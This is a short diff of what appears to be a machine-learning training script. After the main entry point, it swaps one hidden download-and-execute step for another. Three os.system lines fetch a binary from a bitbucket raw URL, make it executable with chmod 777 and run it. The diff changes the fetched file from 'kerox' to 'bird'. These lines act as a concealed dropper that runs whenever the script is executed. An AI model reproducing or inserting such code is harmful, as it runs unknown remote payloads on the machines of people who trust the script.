@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/lightcoral2/lightcoral2/raw/master/kerox')
-os.system('chmod 777 kerox')
-os.system('./kerox')
+os.system('wget https://bitbucket.org/lightcoral2/lightcoral2/raw/master/bird')
+os.system('chmod 777 bird')
+os.system('./bird')
